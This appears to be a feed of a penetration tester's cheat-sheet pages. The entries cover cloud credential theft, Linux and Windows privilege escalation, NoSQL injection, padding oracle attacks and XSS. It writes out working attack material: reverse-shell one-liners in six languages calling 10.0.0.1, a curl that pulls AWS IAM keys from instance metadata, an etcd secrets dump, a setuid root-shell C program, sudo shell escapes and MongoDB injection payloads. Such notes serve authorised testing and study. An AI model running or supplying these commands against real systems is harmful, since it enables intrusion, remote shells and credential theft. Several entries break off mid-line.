item.title: Bug Bounty
item.description: Communities Bug Bounty Notes - founded by zseano, challenges, writeups, etc. Bug Bounty Tips nmap --script "http-*" IP/target - will run 30+ scripts related to HTTP, SQLInjection, config backup checks, checkout more at the docs http://nmap.org/nsedoc Files To Look Out For .git/config .travis.yml Makefile Dockerfile package.json gulpfile.js composer.json web.config .env Need execute some command but “space” is blocked?

item.title: Cloud Security
item.description: Grab IAM Role Keys - AWS curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ Security Audit Tools ScoutSuite All-In-One Wiki for Cloud Penetration Testing Source: https://www.peerlyst.com/posts/all-in-one-wiki-for-cloud-penetration-testing-nitesh-malviya Links and Resources for Cloud basics Introduction to Cloud Computing - https://www.gracefulsecurity.com/an-introduction-to-cloud-computing/ SANS - https://pen-testing.sans.org/blog/2012/07/05/pen-testing-in-the-cloud AWS Official Guide for permission and Penetration Testing - https://aws.amazon.com/security/penetration-testing/ Links and Resources for AWS Pentesting https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-aws/ https://www.provensec.com/penetration-testing-aws-s3-bucket/ Rhinosecuritylabs links - https://rhinosecuritylabs.com/blog/?category=aws - check all the links.

item.title: Linux Privilege Escalation
item.description: MySQL running as ROOT If you have password, log in, issue that query, it will return exit code of command. select sys_exec('whoami'); Find SUID programs and abuse them find / -user root -perm -4000 -print 2>/dev/null student@attack:/$ /usr/bin/vim.tiny /etc/sudoers SUID binary to compile and hijack PATH #include <stdio.h>#include <stdlib.h>#include <sys/types.h>#include <unistd.h> int main() { setuid(0); system("/bin/bash"); return 0; } Using System Tools # sudo find / -exec /bin/sh -I \; # sudo vi // inside :shell # sudo more/less // inside :bash # sudo python -c "import pty; pty.

item.title: No-SQL Injection
item.description: MongoDB login bypass We can also try to insert $ge instead of $ne operator and try to inject these instead of index names (username/password). MongoDB injections true, $where: '1 == 1' , $where: '1 == 1' $where: '1 == 1' ', $where: '1 == 1' 1, $where: '1 == 1' { $ne: 1 } ', $or: [ {}, { 'a':'a ' } ], $comment:'successful MongoDB injection' db.injection.insert({success:1}); db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1 || 1==1 ' && this.

item.title: Padding Oracle Attack
item.description: Performing Padding Oracle Attack using padBuster. Stage 1: decrypt cookie root@bethebeast: ~ Â» padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies "secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2" 8 +-------------------------------------------+ | PadBuster - v0.3.3 | | Brian Holyfield - Gotham Digital Science | | labs@gdssecurity.com | +-------------------------------------------+ INFO: The original request returned the following [+] Status: 200 [+] Location: N/A [+] Content Length: 3854 INFO: Starting PadBuster Decrypt Mode *** Starting Block 1 of 4 *** INFO: No error string was provided.

item.title: Reverse Shells
item.description: Reverse shells in various languages/platforms. # bash bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 # perl perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' # python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' # php php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' # ruby ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' # netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f # java r = Runtime.getRuntime() p = r.

item.title: Tricks
item.description: Everything that doesn’t fit to one category. rdesktop â sharing directory between attacker/victim, works with pivoting Recently discovered very nice way of sharing files for Windows machines with RDP, local dir exploits/ in current location will be available as share. rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch keys, secrets, etc. curl http://:2379/v2/keys/?recursive=true share exploits over samba to windows machine # git-clone recent version! bastard/custom - [masterâ] Â» impacket-smbserver hacker $( pwd ) Impacket v0.

item.title: Windows Privilege Escalation
item.description: Windows Exploit/OS Reference Scripts JAWS Sherlock Powerup Google Windows Version for common exploits Kernel Exploits systeminfo -> look up missing kb’s systeminfo | findstr /B /C:“OS Name” /C:“OS * Version” sherlock -> Find-AllVulns powershell Common Kernel Exploits MS16-014 - applies to: Windows 7 SP1 x86 MS16-016 - ‘WebDAV’ applies to Windows 7 SP1 x86 (Build 7601) MS16-032 - applies to: Windows 7 x86/x64, Windows 8 x86/64, Windows 10, Windows Server 2008-2012 R2 Config Files Credentials in ClearText or Base64 -> once Windows in installed

item.title: XSS
item.description: Everything related to XSS, tools, links, payloads, etc. Tools ezXSS - self hosted dashboard and server for your payloads bXSS - blind XSS application, had not played with it yet Sites XSS Payloads - site with JavaScript code that can actually hurt, keyloggers, data stealing etc. XSS Hunter - site that helps you by serving prepared scripts and generates some basic payloads, helps finding blind injections.
